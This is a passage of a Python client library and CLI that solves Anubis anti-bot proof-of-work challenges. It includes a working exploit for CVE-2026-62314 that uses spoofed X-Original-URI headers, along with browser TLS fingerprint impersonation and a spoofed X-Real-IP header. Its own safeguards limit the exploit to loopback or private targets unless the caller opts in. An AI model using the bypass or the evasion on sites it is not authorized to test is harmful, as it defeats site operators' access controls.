        """The 80-byte Bitcoin block header behind a proof, as 160 hex chars."""
        return self._native.meatrider_header(challenge_hex, difficulty, nonce)

    def meatrider_bits(self, difficulty: int) -> int:
        """nBits for the exact target 2^(256-difficulty)."""
        return self._native.meatrider_bits(difficulty)

    def meatrider_price_usd(self, difficulty: int, usd_per_th_day: float = 0.0) -> float:
        """What an Antminer S21 Pro earns doing 2^difficulty hashes, in USD.

        A label on the work, not a payment: nothing in this library moves money.
        """
        return self._native.meatrider_price_usd(difficulty, usd_per_th_day)

    def meatrider_asic_seconds(self, difficulty: int, hashrate: float = 0.0) -> float:
        """How long an ASIC needs for that rung (234 TH/s unless told otherwise)."""
        return self._native.meatrider_asic_seconds(difficulty, hashrate)

    def meatrider_tier(self, difficulty: int) -> str | None:
        """The rung's name: spark, nano, microbit, dust, suspicious, asic, ..."""
        return self._native.meatrider_tier(difficulty)

    def meatrider_difficulty_for_usd(self, usd: float,
                                     usd_per_th_day: float = 0.0) -> int:
        """The first difficulty whose price reaches `usd`."""
        return self._native.meatrider_difficulty_for_usd(usd, usd_per_th_day)

    def active_kernel(self) -> str:
        """Which kernel answered the last solve (avx512/avx2/cpu/cuda/hashx...)."""
        return self._native.active_kernel()

    def gpu_power_state(self) -> dict:
        """The Intel GPU's clock state, and whether the boost pin is held."""
        return self._native.gpu_power_state()

    def gpu_boost(self, enable: bool = True) -> int:
        """Pin the GPU clock floor at boost (needs write access to sysfs)."""
        return self._native.gpu_boost(enable)

    def gpu_freq_mhz(self) -> int:
        """The Intel GPU clock right now."""
        return self._native.gpu_freq_mhz()

    # -- core -------------------------------------------------------------
    def solve(self, challenge: AnubisChallenge | dict) -> Solution:
        if isinstance(challenge, dict):
            challenge = AnubisChallenge.from_payload(challenge)

        algorithm = challenge.algorithm
        difficulty = int(challenge.difficulty)

        if algorithm in ("fast", "slow"):
            nonce, response, elapsed = self._native.solve_nibbles(
                challenge.random_data, difficulty, self.threads, self.budget_ms
            )
        elif algorithm in ("sha256", "wasm-sha256"):
            nonce, response, elapsed = self._native.solve_bits(
                challenge.random_data, difficulty, self.threads, self.budget_ms
            )
        elif algorithm == "argon2id":
            nonce, response, elapsed = self._native.solve_argon2id(
                challenge.random_data, difficulty, self.threads, self.budget_ms
            )
        elif algorithm == "hashx":
            nonce, response, elapsed = self._native.solve_hashx(
                challenge.random_data, difficulty, self.threads, self.budget_ms
            )
        elif algorithm == "meatrider":
            nonce, response, elapsed = self._native.solve_meatrider(
                challenge.random_data, difficulty, self.threads, self.budget_ms
            )
        elif algorithm == "tensor":
            nonce, response, elapsed = self._native.solve_tensor(
                challenge.random_data, difficulty, self.threads, self.budget_ms
            )
        elif algorithm == "tensor-v":
            return self.solve_tensor_v(challenge)
        else:
            raise UnsupportedAlgorithm(f"unknown challenge algorithm {algorithm!r}")

        return Solution(
            nonce=nonce,
            response=response,
            elapsed_ms=elapsed,
            algorithm=algorithm,
            difficulty=difficulty,
        )

    def solve_tensor_v(self, challenge: AnubisChallenge) -> Solution:
        """The commitment half of `tensor-v`.

        The response is the Merkle root of C. The sample is server-chosen and
        arrives in the pass-challenge JSON, so the HTTP client completes the
        audit; a bare `Solution` cannot be verified on its own.
        """
        root, elapsed = self._native.tensor_v_root(
            challenge.random_data, int(challenge.difficulty)
        )
        return Solution(
            nonce=0,
            response=root,
            elapsed_ms=elapsed,
            algorithm="tensor-v",
            difficulty=int(challenge.difficulty),
        )

    def tensor_v_witness(
        self, challenge: AnubisChallenge, blocks: list[int], positions: list[int]
    ) -> str:
        return self._native.tensor_v_witness(
            challenge.random_data, int(challenge.difficulty), blocks, positions
        )

    # -- verification helpers --------------------------------------------
    def verify(self, challenge: AnubisChallenge, nonce: int) -> bool:
        if challenge.algorithm in ("fast", "slow"):
            ok, _ = self._native.verify_nibbles(
                challenge.random_data, nonce, challenge.difficulty
            )
        elif challenge.algorithm in ("sha256", "wasm-sha256"):
            ok, _ = self._native.verify_bits(
                challenge.random_data, nonce, challenge.difficulty
            )
        elif challenge.algorithm == "argon2id":
            ok, _ = self._native.verify_argon2id(
                challenge.random_data, nonce, challenge.difficulty
            )
        elif challenge.algorithm == "hashx":
            ok, _ = self._native.verify_hashx(
                challenge.random_data, nonce, challenge.difficulty
            )
        elif challenge.algorithm == "meatrider":
            ok, _ = self._native.verify_meatrider(
                challenge.random_data, nonce, challenge.difficulty
            )
        elif challenge.algorithm == "tensor":
            ok, _ = self._native.verify_tensor(
                challenge.random_data, nonce, challenge.difficulty
            )
        else:
            raise UnsupportedAlgorithm(challenge.algorithm)
        return ok

    def sha256_hex(self, data: bytes) -> str:
        return self._native.sha256_hex(data)


# ---------------------------------------------------------------------------
# HTTP client
# ---------------------------------------------------------------------------

CHALLENGE_PATH = "/.within.website/x/cmd/anubis/api/pass-challenge"
AUDIT_PATH = "/.within.website/x/cmd/anubis/api/audit-tensor"
MAKE_CHALLENGE_PATH = "/.within.website/x/cmd/anubis/api/make-challenge"

# CVE-2026-62314: paths covered by the shipped
# (data)/common/keep-internet-working.yaml ALLOW rules.
CVE_62314_PROBE_PATHS = (
    "/.well-known/security.txt",
    "/robots.txt",
    "/favicon.ico",
    "/sitemap.xml",
)


def make_session(
    impersonate: str | None = None, **kwargs: Any
) -> Any:
    """Create an HTTP session.

    With ``impersonate=None`` this is a plain :class:`requests.Session`.
    With a browser name (``"chrome"``, ``"firefox"``, ``"safari"``, …) it is a
    ``curl_cffi.requests.Session`` that presents that browser's TLS/HTTP2
    fingerprint (and default headers) — useful against Anubis deployments that
    weigh JA3/JA4H or User-Agent consistency.
    """
    if impersonate is None:
        return requests.Session(**kwargs)

    if not HAVE_CURL_CFFI:
        raise SolverError(
            "curl_cffi is not installed; run `pip install curl_cffi`"
        )
    return CurlCffiSession(impersonate=impersonate, **kwargs)


class AnubisClient:
    """A requests-compatible session that transparently solves Anubis challenges.

    Parameters
    ----------
    base_url:
        Origin of the Anubis-protected site, e.g. ``http://127.0.0.1:8923``.
    solver:
        Optional pre-built :class:`AnubisSolver`.
    session:
        Optional ``requests.Session`` (cookies are kept there).
    max_attempts:
        How many challenge/response rounds to allow before giving up.
    """

    def __init__(
        self,
        base_url: str = "http://127.0.0.1:8923",
        *,
        solver: AnubisSolver | None = None,
        session: requests.Session | None = None,
        user_agent: str = "anubis-c-solver/1.0 (+python-ctypes)",
        timeout: float = 30.0,
        max_attempts: int = 4,
        lib_path: str | os.PathLike | None = None,
        threads: int | None = None,
        use_cve: bool = False,
        cve_paths: tuple[str, ...] = CVE_62314_PROBE_PATHS,
        impersonate: str | None = None,
        allow_remote_cve: bool = False,
        verify_gpu: bool = True,
        verify_tpu: bool | None = None,
    ) -> None:
        self.base_url = base_url.rstrip("/")
        if session is not None and impersonate is not None:
            raise ValueError("pass either session= or impersonate=, not both")
        if session is not None:
            self.session = session
        else:
            self.session = make_session(impersonate)
        if impersonate is None or session is not None:
            # curl_cffi profiles bring their own browser User-Agent; do not
            # override it (a spoofed TLS fingerprint with a non-browser UA is
            # exactly what JA3/JA4H-based rules look for).
            self.session.headers.setdefault("User-Agent", user_agent)
        # Anubis before ~1.20 refuses requests without X-Real-IP (it is meant
        # to run behind a reverse proxy that sets it). Newer versions derive
        # it from the connection when -use-remote-address is set.
        self.session.headers.setdefault("X-Real-IP", "127.0.0.1")
        self.timeout = timeout
        self.max_attempts = max_attempts
        self.solver = solver or AnubisSolver(
            lib_path=lib_path, threads=threads, verify_gpu=verify_gpu,
            verify_tpu=verify_tpu,
        )
        self.solutions: list[Solution] = []
        self.use_cve = use_cve
        self.cve_paths = cve_paths
        self.allow_remote_cve = allow_remote_cve
        self.cve_bypasses = 0
        self._cve_target_ok: bool | None = None

    def close(self) -> None:
        """Release the underlying HTTP session."""
        close = getattr(self.session, "close", None)
        if callable(close):
            close()

    def __enter__(self) -> AnubisClient:
        return self

    def __exit__(self, *exc_info: object) -> bool:
        self.close()
        return False

    # -- helpers ----------------------------------------------------------
    def _abs(self, url: str) -> str:
        if url.startswith(("http://", "https://")):
            return url
        return self.base_url + ("" if url.startswith("/") else "/") + url

    def _is_challenge(self, resp: requests.Response) -> bool:
        """True for both modern pages (embedded JSON) and pre-1.17 pages.

        Before v1.17 the challenge is not embedded in the page; the browser
        POSTs ``make-challenge`` instead. Those pages are recognized by the
        assets they load.
        """
        ctype = resp.headers.get("Content-Type", "")
        text = resp.text
        if "html" not in ctype and "html" not in text[:200].lower():
            return False
        if 'id="anubis_challenge"' in text:
            return True
        if resp.status_code in (200, 401, 403) and "anubis" in text:
            return (
                "/.within.website/x/cmd/anubis/static/js/main.mjs" in text
                or 'id="anubis_version"' in text
            )
        return False

    def _legacy_challenge(self) -> AnubisChallenge | None:
        """Old protocol: POST make-challenge to obtain {challenge, rules}."""
        try:
            resp = self.session.post(
                self._abs(MAKE_CHALLENGE_PATH), timeout=self.timeout
            )
            payload = resp.json()
        except (*REQUEST_ERRORS, ValueError):
            return None

        if not isinstance(payload, dict) or "challenge" not in payload:
            return None

        rules = payload.get("rules")
        if isinstance(rules, dict):
            algorithm = rules.get("algorithm") or "fast"
            difficulty = int(rules.get("difficulty") or 0)
        else:
            algorithm = payload.get("algorithm") or "fast"
            difficulty = int(payload.get("difficulty") or 0)

        return AnubisChallenge(
            id="",
            random_data=str(payload["challenge"]),
            algorithm=algorithm,
            difficulty=difficulty,
        )

    def _cve_target_allowed(self) -> bool:
        """Only loopback/private targets unless the caller opted in."""
        if self.allow_remote_cve:
            return True
        if self._cve_target_ok is not None:
            return self._cve_target_ok
        parsed = urlsplit(self.base_url)
        host = parsed.hostname
        if host is None and "://" not in self.base_url:
            host = urlsplit("//" + self.base_url).hostname
        host = (host or "").strip("[]")
        ok = False
        try:
            for info in socket.getaddrinfo(host, None):
                addr = ipaddress.ip_address(info[4][0])
                if addr.is_loopback or addr.is_private:
                    ok = True
                    break
        except (OSError, ValueError):
            ok = False
        self._cve_target_ok = ok
        return ok

    def _try_cve_bypass(self, url: str, **kwargs: Any) -> requests.Response | None:
        """CVE-2026-62314: match a shipped ALLOW rule via X-Original-URI.

        This is an exploit of a known vulnerability, not part of the Anubis
        protocol. Only used after the server has already answered with a
        challenge page, and only against loopback/private targets unless the
        caller passed allow_remote_cve=True.
        """
        if not self._cve_target_allowed():
            return None
        extra = kwargs.pop("headers", None) or {}
        for probe in self.cve_paths:
            headers = {**extra, "X-Original-URI": probe}
            try:
                resp = self.session.get(url, headers=headers, **kwargs)
            except REQUEST_ERRORS:
                return None
            if resp.status_code < 400 and not self._is_challenge(resp):
                warnings.warn(
                    "CVE-2026-62314 bypass used against "
                    f"{self.base_url!r}; only do this against systems you are "
                    "authorized to test",
                    stacklevel=3,
                )
                return resp
        return None

    def _solve_and_pass(self, url: str, challenge: AnubisChallenge) -> Solution:
        solution = self.solver.solve(challenge)
        self.solutions.append(solution)

        if challenge.algorithm == "tensor-v":
            # Step 1: send the root, receive the sample. The gate returns JSON.
            params = {"response": solution.response, "nonce": "0", "redir": url}
            if challenge.id:
                params["id"] = challenge.id
            probe = self.session.get(
                self._abs(CHALLENGE_PATH), params=params, timeout=self.timeout,
                allow_redirects=False,
            )
            try:
                audit = probe.json()["audit"]
                blocks = audit["blocks"]
                positions = audit["positions"]
            except (ValueError, KeyError, TypeError) as exc:
                raise ChallengeError(
                    "the gate did not return a tensor-v sample; is it a "
                    "tensor-v challenge on a gate that supports the audit endpoint?"
                ) from exc

            # Step 2: open the sampled blocks. The cookie is set on this response.
            witness = self.solver.tensor_v_witness(challenge, blocks, positions)
            body = {"root": solution.response, "audit": witness, "redir": url}
            if challenge.id:
                body["id"] = challenge.id
            done = self.session.post(
                self._abs(AUDIT_PATH), json=body, timeout=self.timeout,
                allow_redirects=False,
            )
            if done.status_code != 200:
                raise ChallengeError(
                    f"tensor-v audit was rejected ({done.status_code}): "
                    f"{done.text[:200]}"
                )
            return solution

        params = {
            "response": solution.response,
            "nonce": str(solution.nonce),
            "redir": url,
            "elapsedTime": f"{solution.elapsed_ms:.3f}",
        }
        if challenge.id:
            params["id"] = challenge.id

        # Do not follow the 302 here: the auth cookie is set on this response,
        # and re-requesting the original URL gives us the body.
        self.session.get(
            self._abs(CHALLENGE_PATH),
            params=params,
            timeout=self.timeout,
            allow_redirects=False,
        )
        return solution

    # -- public API -------------------------------------------------------
    def get(self, path: str = "/", **kwargs: Any) -> requests.Response:
        """GET a URL, solving any anubis challenge on the way."""
        url = self._abs(path)
        kwargs.setdefault("timeout", self.timeout)
        resp = self.session.get(url, **kwargs)

        if self.use_cve and self._is_challenge(resp):
            bypassed = self._try_cve_bypass(url, **kwargs)
            if bypassed is not None:
                self.cve_bypasses += 1
                return bypassed

        for _ in range(self.max_attempts):
            if not self._is_challenge(resp):
                return resp

            challenge = parse_challenge(resp.text)
            if challenge is None:
                challenge = self._legacy_challenge()
            if challenge is None:
                raise ChallengeError(
                    "page looks like a challenge but no challenge data was found"
                )

            self._solve_and_pass(url, challenge)
            resp = self.session.get(url, **kwargs)

        return resp

    def pass_challenge(self, page_url: str = "/") -> Solution:
        """Solve a single challenge and return the solution (no final GET)."""
        resp = self.session.get(self._abs(page_url), timeout=self.timeout)
        challenge = parse_challenge(resp.text)
        if challenge is None:
            raise ChallengeError("no anubis challenge present at " + page_url)

        return self._solve_and_pass(self._abs(page_url), challenge)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------


def _main(argv: list[str]) -> int:
    import argparse

    parser = argparse.ArgumentParser(
        description="Solve an anubis proof-of-work challenge and fetch a page"
    )
    parser.add_argument("url", nargs="?", help="URL protected by anubis")
    parser.add_argument("--backends", action="store_true", help="print the backend inventory and exit")
    parser.add_argument("--threads", type=int, default=None)
    parser.add_argument("--lib", default=None, help="path to libanubis_solver.so")
    parser.add_argument("--timeout", type=float, default=30.0)
    parser.add_argument(
        "--impersonate",
        default=None,
        help='curl_cffi browser profile, e.g. "chrome" or "chrome120"',
    )
    parser.add_argument(
        "--cve",
        action="store_true",
        help="try the CVE-2026-62314 bypass (authorized targets only)",
    )
    parser.add_argument(
        "--allow-remote-cve",
        action="store_true",
        help="allow the CVE bypass against non-loopback targets",
    )
    parser.add_argument(
        "--no-verify-gpu",
        action="store_true",
        help="skip the CPU re-check of GPU hits (benchmarking only)",
    )
    parser.add_argument(
        "--no-verify-tpu",
        action="store_true",
        help="skip the CPU re-check of TPU hits (benchmarking only)",
    )
    parser.add_argument(
        "--affinity",
        default=None,
        help='CPU affinity: "pcores" (default), "off", or a mask like "0,2,4,6"',
    )
    args = parser.parse_args(argv)

    if args.affinity is not None:
        os.environ["ANUBIS_CPU_AFFINITY"] = args.affinity

    if args.backends:
        print(AnubisSolver(lib_path=args.lib).backend_report())
        return 0
    if args.url is None:
        parser.error("the url argument is required unless --backends is used")

    client = AnubisClient(
        args.url,
        lib_path=args.lib,
        threads=args.threads,
        timeout=args.timeout,
        use_cve=args.cve,
        allow_remote_cve=args.allow_remote_cve,
        impersonate=args.impersonate,
        verify_gpu=not args.no_verify_gpu,
        verify_tpu=False if args.no_verify_tpu else None,
    )
    resp = client.get("/")
    if client.cve_bypasses:
        print("bypassed via CVE-2026-62314 (X-Original-URI); no proof-of-work run")
    for sol in client.solutions:
        print(
            f"solved {sol.algorithm} difficulty={sol.difficulty} "
            f"nonce={sol.nonce} in {sol.elapsed_ms:.1f} ms"
        )
    print(f"HTTP {resp.status_code} ({len(resp.content)} bytes)")
    print(resp.text[:2000])
    return 0 if resp.status_code < 400 else 1


def cli() -> None:
    """Console-script entry point: `anubis-solver ...`."""
    raise SystemExit(_main(sys.argv[1:]))


if __name__ == "__main__":
    raise SystemExit(_main(sys.argv[1:]))
